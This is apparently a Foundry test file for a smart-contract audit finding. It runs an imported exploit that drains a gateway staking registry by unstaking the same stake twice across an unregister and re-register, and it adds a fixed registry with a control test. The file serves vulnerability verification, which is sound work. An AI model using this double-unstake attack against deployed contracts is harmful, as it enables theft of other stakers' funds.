// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    MiniToken,
    MockRouter,
    GatewayRegistry
} from "./31545-c-01-gateway-creator-can-steal-all-tokens-from-the-gatewayre.sol";

/// Same registry, except unregister deletes stakes[]. The second unstake then reverts.
contract GatewayRegistryFixed {
    struct Stake {
        uint256 amount;
        uint256 computationUnits;
        uint128 lockStart;
        uint128 lockEnd;
    }

    struct Gateway {
        address operator;
        bytes peerId;
        address strategy;
        address ownAddress;
        string metadata;
        uint256 totalStaked;
        uint256 totalUnstaked;
    }

    MiniToken public token;
    MockRouter public router;
    mapping(bytes32 => Gateway) internal gateways;
    mapping(bytes32 => Stake[]) internal stakes;
    mapping(address => bytes32) public gatewayByAddress;
    address public defaultStrategy;

    constructor(MiniToken _token, MockRouter _router) {
        token = _token;
        router = _router;
    }

    function register(bytes calldata peerId, string memory metadata, address gatewayAddress) public {
        require(peerId.length > 0, "Cannot set empty peerId");
        bytes32 peerIdHash = keccak256(peerId);
        require(gateways[peerIdHash].operator == address(0), "PeerId already registered");
        gateways[peerIdHash] = Gateway({
            operator: msg.sender,
            peerId: peerId,
            strategy: defaultStrategy,
            ownAddress: gatewayAddress,
            metadata: metadata,
            totalStaked: 0,
            totalUnstaked: 0
        });
    }

    function unregister(bytes calldata peerId) external {
        (Gateway storage gateway, bytes32 peerIdHash) = _getGateway(peerId);
        _requireOperator(gateway);
        require(gateway.totalStaked == gateway.totalUnstaked, "Gateway has staked tokens");
        delete gatewayByAddress[gateway.ownAddress];
        delete gateways[peerIdHash];
        delete stakes[peerIdHash];
    }

    function stake(bytes calldata peerId, uint256 amount, uint128 durationEpochs) public {
        _stakeWithoutTransfer(peerId, amount, durationEpochs);
        token.transferFrom(msg.sender, address(this), amount);
    }

    function _stakeWithoutTransfer(bytes calldata peerId, uint256 amount, uint128 durationBlocks) internal {
        (Gateway storage gateway, bytes32 peerIdHash) = _getGateway(peerId);
        _requireOperator(gateway);
        uint128 lockStart = router.networkController().nextEpoch();
        uint128 lockEnd = lockStart + durationBlocks;
        stakes[peerIdHash].push(Stake(amount, amount, lockStart, lockEnd));
        gateway.totalStaked += amount;
    }

    function unstake(bytes calldata peerId, uint256 amount) public {
        (Gateway storage gateway,) = _getGateway(peerId);
        _requireOperator(gateway);
        require(amount <= _unstakeable(gateway), "Not enough funds to unstake");
        gateway.totalUnstaked += amount;
        token.transfer(msg.sender, amount);
    }

    function _unstakeable(Gateway storage gateway) internal view returns (uint256) {
        Stake[] memory _stakes = stakes[keccak256(gateway.peerId)];
        uint256 blockNumber = block.number;
        uint256 total = 0;
        for (uint256 i = 0; i < _stakes.length; i++) {
            Stake memory _stake = _stakes[i];
            if (_stake.lockEnd <= blockNumber) total += _stake.amount;
        }
        return total - gateway.totalUnstaked;
    }

    function stakeCount(bytes calldata peerId) external view returns (uint256) {
        return stakes[keccak256(peerId)].length;
    }

    function _getGateway(bytes calldata peerId) internal view returns (Gateway storage gateway, bytes32 peerIdHash) {
        peerIdHash = keccak256(peerId);
        gateway = gateways[peerIdHash];
        require(gateway.operator != address(0), "Gateway not registered");
    }

    function _requireOperator(Gateway storage _gateway) internal view {
        require(_gateway.operator == msg.sender, "Only operator can call this function");
    }
}

contract Finding31545Test is Test {
    uint256 internal constant REPLAY_BLOCK = 301;

    function test_exploit_double_unstake_drains_registry() public {
        vm.roll(REPLAY_BLOCK);
        Exploit e = new Exploit();
        e.run();

        assertEq(block.number, 301, "replay block");
        assertEq(e.registryAtStake(), 200e18, "registry held two stakes");
        assertEq(e.firstPayout(), 100e18, "first unstake paid 100 SQD");
        assertEq(e.secondPayout(), 100e18, "second unstake paid the same 100 SQD");
        assertEq(e.sqd().balanceOf(address(e.reg())), 0, "registry drained to 0");
        assertEq(e.sqd().balanceOf(address(e)), 200e18, "attacker received both stakes");
        assertEq(e.reg().stakeCount(bytes("alice")), 1, "stake row was not deleted");
        assertEq(e.reg().stakeAmount(bytes("alice")), 100e18, "row still records 100 SQD");
        assertEq(e.reg().stakeLockEnd(bytes("alice")), 201, "lockEnd already behind block 301");
        assertEq(e.reg().totalStakedOf(bytes("alice")), 0, "re-register zeroed totalStaked");
        assertEq(e.reg().totalUnstakedOf(bytes("alice")), 100e18, "counter only shows the second unstake");
        assertEq(e.reg().totalStakedOf(bytes("other")), 100e18, "other gateway still owed 100 SQD");
        assertEq(e.reg().totalUnstakedOf(bytes("other")), 0, "other gateway has not unstaked");

        GatewayRegistry reg = e.reg();
        address otherOp = address(e.other());
        vm.expectRevert();
        vm.prank(otherOp);
        reg.unstake(bytes("other"), 100e18);
        assertEq(e.sqd().balanceOf(address(reg)), 0, "other withdrawal finds an empty registry");
    }

    function test_control_deleting_stakes_blocks_second_unstake() public {
        MiniToken sqd = new MiniToken("Subsquid", "SQD");
        MockRouter router = new MockRouter();
        GatewayRegistryFixed reg = new GatewayRegistryFixed(sqd, router);
        sqd.mint(address(this), 200e18);
        sqd.approve(address(reg), type(uint256).max);
        vm.roll(REPLAY_BLOCK);

        reg.register(bytes("other"), "", address(0));
        reg.stake(bytes("other"), 100e18, 200);
        reg.register(bytes("alice"), "", address(0x6a7e));
        reg.stake(bytes("alice"), 100e18, 200);
        assertEq(sqd.balanceOf(address(reg)), 200e18, "two stakes funded");

        reg.unstake(bytes("alice"), 100e18);
        assertEq(sqd.balanceOf(address(reg)), 100e18, "first unstake is the real withdrawal");
        reg.unregister(bytes("alice"));
        assertEq(reg.stakeCount(bytes("alice")), 0, "fix deleted the stake row");
        reg.register(bytes("alice"), "", address(0x6a7e));

        vm.expectRevert(bytes("Not enough funds to unstake"));
        reg.unstake(bytes("alice"), 100e18);
        assertEq(sqd.balanceOf(address(reg)), 100e18, "second unstake paid 0");
        assertEq(sqd.balanceOf(address(this)), 100e18, "caller kept only the first payout");
    }
}
